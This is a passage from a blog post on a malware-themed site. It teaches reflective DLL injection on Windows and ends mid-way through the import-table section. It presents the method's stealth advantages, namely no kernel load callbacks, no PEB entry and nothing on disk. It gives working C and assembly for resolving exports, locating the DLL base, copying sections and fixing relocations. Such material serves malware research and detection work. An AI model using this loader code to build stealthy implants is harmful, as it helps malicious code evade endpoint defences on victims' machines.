# https://oblivion-malware.xyz/posts/reflective-dll-injection/

<!DOCTYPE html><html lang="en"><body><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Reflective DLL Injection</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h1 id="what-is-reflective-dll-injection">What is Reflective DLL Injection</h1><p>Reflective DLL Injection is nothing more than a way to load a DLL directly into the memory of the target process (which can also be the current process) instead of loading it using the LoadLibrary WinAPI, which utilizes the Windows DLL Loader. We will build an exported function that will perform all the reflective loader passes to execute our DllMain entrypoint.</p><h1 id="reflective-dll-injection-x-windows-dll-loader">Reflective DLL Injection x Windows DLL Loader</h1><div class="table-wrapper"><table><thead><tr><th><strong>Reflective DLL Injection</strong></th><th><strong>Windows DLL Loader</strong></th></tr></thead><tbody><tr><td>Does not trigger kernel callbacks for image loads</td><td>Triggers Kernel Callbacks for Image Loads</td></tr><tr><td>Can be obfuscated</td><td>Cannot be obfuscated</td></tr><tr><td>Cannot be found through the Process Environment Block (PEB)</td><td>Can be found through the Process Environment Block (PEB)</td></tr><tr><td>The file does not need to be on disk</td><td>The file needs to be on disk</td></tr></tbody></table></div><h1 id="requirements">Requirements</h1><p>To ensure reflective loading and make the DLL position-independent, several crucial steps must be taken. These include resolving/correcting the Relocation Table, the Import Address Table. However, we face a problem where we might leave Indicators of Compromise (IOCs) because when allocating memory for the DLL, we would have to use memory with RWX (Read-Write-Execute) permissions, and potentially have issues with TLS (Thread Local Storage) Callbacks. Therefore, I have added 2 more steps to this chapter on Reflective PE, its the memory protections of the sections, and executing the TLS Callbacks. Another consideration is that in the exported function, we cannot use WinAPI directly. All WinAPI functions must be resolved using … and … , as the Import Address Table has not yet been resolved.</p><h1 id="upgrade-in-dynamic-syscall">Upgrade in dynamic syscall</h1><p>For this project, I’ve decided to upgrade the dynamic loading functions I mentioned earlier, so I’ve added support for forwarded functions, example of the fowarded function can be found here …</p><h2 id="ldrfuncaddr"><span class="me-2">LdrFuncAddr</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#ldrfuncaddr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre></td><td class="rouge-code"><pre><span class="n">PVOID</span> <span class="nf">LdrFuncAddr</span><span class="p">(</span> 
    <span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">BaseModule</span><span class="p">,</span> 
    <span class="n">_In_</span> <span class="n">PSTR</span> <span class="n">FuncName</span> 
<span class="p">)</span> <span class="p">{</span>
    <span class="n">PIMAGE_NT_HEADERS</span>       <span class="n">pImgNt</span>         <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pImgExportDir</span>  <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">DWORD</span>                   <span class="n">ExpDirSz</span>       <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
    <span class="n">PDWORD</span>                  <span class="n">AddrOfFuncs</span>    <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PDWORD</span>                  <span class="n">AddrOfNames</span>    <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PWORD</span>                   <span class="n">AddrOfOrdinals</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PVOID</span>                   <span class="n">FuncAddr</span>       <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">pImgNt</span>          <span class="o">=</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">BaseModule</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">BaseModule</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span> <span class="p">);</span>
    <span class="n">pImgExportDir</span>   <span class="o">=</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">BaseModule</span> <span class="o">+</span> <span class="n">pImgNt</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">VirtualAddress</span> <span class="p">);</span>
    <span class="n">ExpDirSz</span>        <span class="o">=</span> <span class="n">U_PTR</span><span class="p">(</span> <span class="n">BaseModule</span> <span class="o">+</span> <span class="n">pImgNt</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">Size</span> <span class="p">);</span>

    <span class="n">AddrOfNames</span>     <span class="o">=</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">BaseModule</span> <span class="o">+</span> <span class="n">pImgExportDir</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span> <span class="p">);</span>
    <span class="n">AddrOfFuncs</span>     <span class="o">=</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">BaseModule</span> <span class="o">+</span> <span class="n">pImgExportDir</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span> <span class="p">);</span>
    <span class="n">AddrOfOrdinals</span>  <span class="o">=</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">BaseModule</span> <span class="o">+</span> <span class="n">pImgExportDir</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span> <span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pImgExportDir</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">PCHAR</span> <span class="n">pFuncName</span>         <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)(</span> <span class="n">BaseModule</span> <span class="o">+</span> <span class="n">AddrOfNames</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">);</span>
        <span class="n">PVOID</span> <span class="n">pFunctionAddress</span>  <span class="o">=</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">BaseModule</span> <span class="o">+</span> <span class="n">AddrOfFuncs</span><span class="p">[</span><span class="n">AddrOfOrdinals</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span> <span class="n">StringCompareA</span><span class="p">(</span> <span class="n">pFuncName</span><span class="p">,</span> <span class="n">FuncName</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">((</span> <span class="n">U_PTR</span><span class="p">(</span> <span class="n">pFunctionAddress</span> <span class="p">)</span> <span class="o">&gt;=</span> <span class="n">U_PTR</span><span class="p">(</span> <span class="n">pImgExportDir</span> <span class="p">)</span> <span class="p">)</span> <span class="o">&amp;&amp;</span>
                <span class="p">(</span> <span class="n">U_PTR</span><span class="p">(</span> <span class="n">pFunctionAddress</span> <span class="p">)</span>  <span class="o">&lt;</span> <span class="n">U_PTR</span><span class="p">(</span> <span class="n">pImgExportDir</span> <span class="p">)</span> <span class="o">+</span> <span class="n">ExpDirSz</span> <span class="p">))</span> <span class="p">{</span>

                <span class="n">CHAR</span>  <span class="n">ForwarderName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
                <span class="n">DWORD</span> <span class="n">dwOffset</span>                <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
                <span class="n">PCHAR</span> <span class="n">FuncMod</span>                 <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
                <span class="n">PCHAR</span> <span class="n">nwFuncName</span>              <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

                <span class="n">MemCopy</span><span class="p">(</span> <span class="n">ForwarderName</span><span class="p">,</span> <span class="n">pFunctionAddress</span><span class="p">,</span> <span class="n">StringLengthA</span><span class="p">(</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="p">)</span> <span class="p">);</span>

                <span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">StringLengthA</span><span class="p">(</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">ForwarderName</span> <span class="p">)</span> <span class="p">;</span> <span class="n">j</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(((</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">ForwarderName</span><span class="p">)[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'.'</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">dwOffset</span>         <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
                        <span class="n">ForwarderName</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>

                <span class="n">FuncMod</span>    <span class="o">=</span> <span class="n">ForwarderName</span><span class="p">;</span>
                <span class="n">nwFuncName</span> <span class="o">=</span> <span class="n">ForwarderName</span> <span class="o">+</span> <span class="n">dwOffset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>

                <span class="kt">char</span>  <span class="n">cLoadLibraryA</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="sc">'L'</span><span class="p">,</span> <span class="sc">'o'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'d'</span><span class="p">,</span> <span class="sc">'L'</span><span class="p">,</span> <span class="sc">'i'</span><span class="p">,</span> <span class="sc">'b'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'a'</span><span class="p">,</span> <span class="sc">'r'</span><span class="p">,</span> <span class="sc">'y'</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
                <span class="n">WCHAR</span> <span class="n">wKernel32</span><span class="p">[]</span>     <span class="o">=</span> <span class="p">{</span> <span class="sc">L'K'</span><span class="p">,</span> <span class="sc">L'E'</span><span class="p">,</span> <span class="sc">L'R'</span><span class="p">,</span> <span class="sc">L'N'</span><span class="p">,</span> <span class="sc">L'E'</span><span class="p">,</span> <span class="sc">L'L'</span><span class="p">,</span> <span class="sc">L'3'</span><span class="p">,</span> <span class="sc">L'2'</span><span class="p">,</span> <span class="sc">L'.'</span><span class="p">,</span> <span class="sc">L'D'</span><span class="p">,</span> <span class="sc">L'L'</span><span class="p">,</span> <span class="sc">L'L'</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>

                <span class="n">fnLoadLibraryA</span> <span class="n">pLoadLibraryA</span> <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span><span class="n">LdrModuleAddr</span><span class="p">(</span><span class="s">L"KERNEL32.DLL"</span><span class="p">),</span> <span class="n">cLoadLibraryA</span> <span class="p">);</span>

                <span class="n">HMODULE</span> <span class="n">hForwardedModule</span> <span class="o">=</span> <span class="n">pLoadLibraryA</span><span class="p">(</span><span class="n">FuncMod</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span> <span class="n">hForwardedModule</span> <span class="p">)</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span> <span class="n">nwFuncName</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'#'</span> <span class="p">)</span> <span class="p">{</span>
                        <span class="kt">int</span> <span class="n">ordinal</span> <span class="o">=</span> <span class="p">(</span><span class="n">INT</span><span class="p">)(</span> <span class="n">nwFuncName</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">);</span>
                        <span class="k">return</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">LdrFuncAddr</span><span class="p">(</span> <span class="n">hForwardedModule</span><span class="p">,</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">ordinal</span> <span class="p">);</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">LdrFuncAddr</span><span class="p">(</span> <span class="n">hForwardedModule</span><span class="p">,</span> <span class="n">nwFuncName</span> <span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">C_PTR</span><span class="p">(</span> <span class="n">pFunctionAddress</span> <span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h1 id="steps-for-reflective-loader">Steps for Reflective Loader</h1><ul><li>Get DLL Base Address</li><li>Allocate memory to store the DLL.</li><li>Copy the DLL sections to the allocated memory.</li><li>Resolve relocations.</li><li>Correct the Import Address Table.</li><li>Re-Define memory permissions</li><li>Execute TLS Callbacks.</li><li>Execute the EntryPoint (DllMain).</li></ul><h2 id="get-dll-base-address"><span class="me-2">Get DLL Base Address</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#get-dll-base-address" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It is necessary to obtain the base address from where the Reflective DLL was injected because we need to parse the PE header for subsequent activities, there are several ways to do this but for now we will use the simplest way which is getting the return address from the stack and looping looking for the magic bytes, a demonstration of the code below:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>section .text

global RDIcaller

RDIcaller:
       call pop
       pop:
       pop rcx                  
   loop:
       xor rbx, rbx
       mov ebx, 0x5A4D
       dec rcx
       cmp bx,  [ rcx ]
       jne loop
       xor rax, rax
       mov ax,  [ rcx + 0x3C ]
       add rax, rcx
       xor rbx, rbx
       add bx,  0x4550
       cmp bx,  [ rax ]
       jne loop
       mov rax, rcx
   ret
</pre></td></tr></tbody></table></code></div></div><h2 id="memory-allocation"><span class="me-2">Memory Allocation</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#memory-allocation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First and foremost, we’ll allocate memory for our Reflective DLL. We’ll use the VirtualAlloc WinAPI, passing the size of the image (SizeOfImage). Then, we’ll use multiple memcpy operations in a loop to copy the data of sections to the allocated memory.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">DllAddr</span> <span class="o">=</span> <span class="n">pVirtualAlloc</span><span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pImgNtHdrs</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">);</span>

<span class="k">for</span> <span class="p">(</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pImgNtHdrs</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">){</span>
    <span class="n">MemCopy</span><span class="p">(</span>
        <span class="n">C_PTR</span><span class="p">(</span><span class="n">DllAddr</span> <span class="o">+</span> <span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">),</span>
        <span class="n">C_PTR</span><span class="p">(</span><span class="n">LibAddr</span> <span class="o">+</span> <span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">PointerToRawData</span><span class="p">),</span>
        <span class="n">pImgSectHdr</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">SizeOfRawData</span>
    <span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="fix-relocation"><span class="me-2">Fix Relocation</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#fix-relocation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is necessary because all these resources rely on our DLL being loaded at the ImageBase (also known as the preferred address), which is a member of the Optional Header. Relocation Table is located in .reloc section. However, when loaded into a process, it will be allocated to a different memory space. Therefore, to find the new preferred address, we must use (ImageBase - Allocation Address).</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">dwOffset</span> <span class="o">=</span> <span class="n">DEREF_64</span><span class="p">(</span> <span class="n">DllAddr</span> <span class="p">)</span> <span class="o">-</span> <span class="n">pImgNtHdrs</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>Now we need to obtain the virtual address of the Base Relocation Table. We can access it directly through the VirtualAddress field of the Optional Header, via Optional Header -&gt; Data Directory[x], where x represents the index of the data directory array corresponding to BASE RELOC. However, a more elegant way to do this is by using the IMAGE_DIRECTORY_ENTRY_BASERELOC macro, as demonstrated below.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">pEntryReloc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pImgNtHdrs</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="p">];</span>
</pre></td></tr></tbody></table></code></div></div><p>The relocation table consists of blocks of IMAGE_BASE_RELOCATION, as shown below in the structure:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_IMAGE_BASE_RELOCATION</span> <span class="p">{</span>
    <span class="n">DWORD</span>   <span class="n">VirtualAddress</span><span class="p">;</span>	
    <span class="n">DWORD</span>   <span class="n">SizeOfBlock</span><span class="p">;</span>	
<span class="p">}</span> <span class="n">IMAGE_BASE_RELOCATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PIMAGE_BASE_RELOCATION</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>We can iterate over these blocks by taking the VirtualAddress + SizeOfBlock, an image below will be used to represent:</p><p></p><p>Relocation Entry is a <strong>BASE_RELOCATION_ENTRY</strong> structure where we will apply relocations:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_IMAGE_RELOCATION_ENTRY</span> <span class="p">{</span>
    <span class="n">WORD</span> <span class="n">Offset</span> <span class="o">:</span> <span class="mi">12</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">Type</span> <span class="o">:</span> <span class="mi">4</span><span class="p">;</span>
<span class="p">}</span> <span class="n">IMAGE_RELOCATION_ENTRY</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div><p>There are several Base Relocation Types, and we will perform relocation corrections on the main ones, which are:</p><div class="table-wrapper"><table><thead><tr><th><strong>Name</strong></th><th><strong>Value</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>IMAGE_REL_BASED_ABSOLUTE</td><td>0x00</td><td>The base relocation adds the high 16 bits of the difference to the 16-bit field at offset. The 16-bit field.</td></tr><tr><td>IMAGE_REL_BASED_HIGH</td><td>0x01</td><td>The base relocation adds the high 16 bits of the difference to the 16-bit field at offset.</td></tr><tr><td>IMAGE_REL_BASED_LOW</td><td>0x02</td><td>The base relocation adds the low 16 bits of the difference to the 16-bit field at offset. The 16-bit field represents the low half of a 32-bit word.</td></tr><tr><td>IMAGE_REL_BASED_HIGHLOW</td><td>0x03</td><td>The base relocation applies all 32 bits of the difference to the 32-bit field at offset.</td></tr><tr><td>IMAGE_REL_BASED_DIR64</td><td>0x010</td><td>The base relocation applies the difference to the 64-bit field at offset.</td></tr></tbody></table></div><p>Now, a code demonstration that performs the entire relocation process:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre></td><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">FixReloc</span><span class="p">(</span> 
    <span class="n">_In_</span> <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">pEntryReloc</span><span class="p">,</span> 
    <span class="n">_In_</span> <span class="n">PVOID</span>                 <span class="n">NewImgAddr</span><span class="p">,</span> 
    <span class="n">_In_</span> <span class="n">DWORD64</span>               <span class="n">DeltaOffset</span> 
<span class="p">)</span> <span class="p">{</span>

    <span class="n">PVOID</span>                   <span class="n">FirstRelocBlock</span> <span class="o">=</span>  <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PIMAGE_BASE_RELOCATION</span>  <span class="n">CurRelocBlock</span>   <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">PIMAGE_RELOCATION_ENTRY</span> <span class="n">RelocEntry</span>      <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span> 
    <span class="n">DWORD64</span>                 <span class="n">RelocRVA</span>        <span class="o">=</span>   <span class="mi">0</span>  <span class="p">;</span>
    <span class="n">DWORD64</span>                 <span class="o">*</span><span class="n">RelocAddr</span>      <span class="o">=</span>   <span class="mi">0</span>  <span class="p">;</span>

    <span class="n">FirstRelocBlock</span> <span class="o">=</span> <span class="p">(</span> <span class="n">NewImgAddr</span> <span class="o">+</span> <span class="n">pEntryReloc</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="p">);</span>
    <span class="n">CurRelocBlock</span>   <span class="o">=</span> <span class="n">FirstRelocBlock</span><span class="p">;</span>

    <span class="k">while</span><span class="p">(</span> <span class="n">CurRelocBlock</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="p">){</span>

        <span class="n">RelocEntry</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">CurRelocBlock</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

        <span class="k">while</span><span class="p">(</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">RelocEntry</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">CurRelocBlock</span> <span class="o">+</span> <span class="n">CurRelocBlock</span><span class="o">-&gt;</span><span class="n">SizeOfBlock</span> <span class="p">){</span>
            
            <span class="n">RelocRVA</span>   <span class="o">=</span> <span class="n">CurRelocBlock</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="o">+</span> <span class="n">RelocEntry</span><span class="o">-&gt;</span><span class="n">Offset</span><span class="p">;</span>
            <span class="o">*</span><span class="n">RelocAddr</span> <span class="o">=</span> <span class="n">NewImgAddr</span> <span class="o">+</span> <span class="n">RelocRVA</span><span class="p">;</span>

            <span class="k">switch</span><span class="p">(</span><span class="n">RelocEntry</span><span class="o">-&gt;</span><span class="n">Type</span><span class="p">){</span>
                <span class="k">case</span> <span class="n">IMAGE_REL_BASED_HIGH</span><span class="p">:</span>
                    <span class="c1">// 16 high bits</span>
                    <span class="o">*</span><span class="n">RelocAddr</span> <span class="o">+=</span> <span class="n">HIWORD</span><span class="p">(</span><span class="n">DeltaOffset</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="n">IMAGE_REL_BASED_LOW</span><span class="p">:</span>
                    <span class="c1">// 16 low bits</span>
                    <span class="o">*</span><span class="n">RelocAddr</span> <span class="o">+=</span> <span class="n">LOWORD</span><span class="p">(</span><span class="n">DeltaOffset</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="n">IMAGE_REL_BASED_HIGHLOW</span><span class="p">:</span>
                    <span class="c1">// 32 bits</span>
                    <span class="o">*</span><span class="n">RelocAddr</span> <span class="o">+=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">DeltaOffset</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">case</span> <span class="n">IMAGE_REL_BASED_DIR64</span><span class="p">:</span>
                    <span class="c1">// 64 bits</span>
                    <span class="o">*</span><span class="n">RelocAddr</span> <span class="o">+=</span> <span class="n">DeltaOffset</span><span class="p">;</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="nl">default:</span>
                    <span class="k">break</span><span class="p">;</span>
    		<span class="p">}</span>  

            <span class="n">RelocEntry</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">CurRelocBlock</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">CurRelocBlock</span> <span class="o">+</span> <span class="n">CurRelocBlock</span><span class="o">-&gt;</span><span class="n">SizeOfBlock</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>

<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="correcting-iat"><span class="me-2">Correcting IAT</span><a href="https://oblivion-malware.xyz/posts/reflective-dll-injection/#correcting-iat" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Its necessary correct the Import Address Table because when the Windows DLL Loader loads the DLL into a process, it already fills the IAT with addresses of the functions used by the PE. However, since we’re injecting the DLL into the memory of a process, we need to do this same work manually. The Import Directory Table is located in the idata section and has an array of <strong>IMAGE_IMPORT_DESCRIPTOR</strong> represented by the following structure:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_IMAGE_IMPORT_DESCRIPTOR</span> <span class="p">{</span>
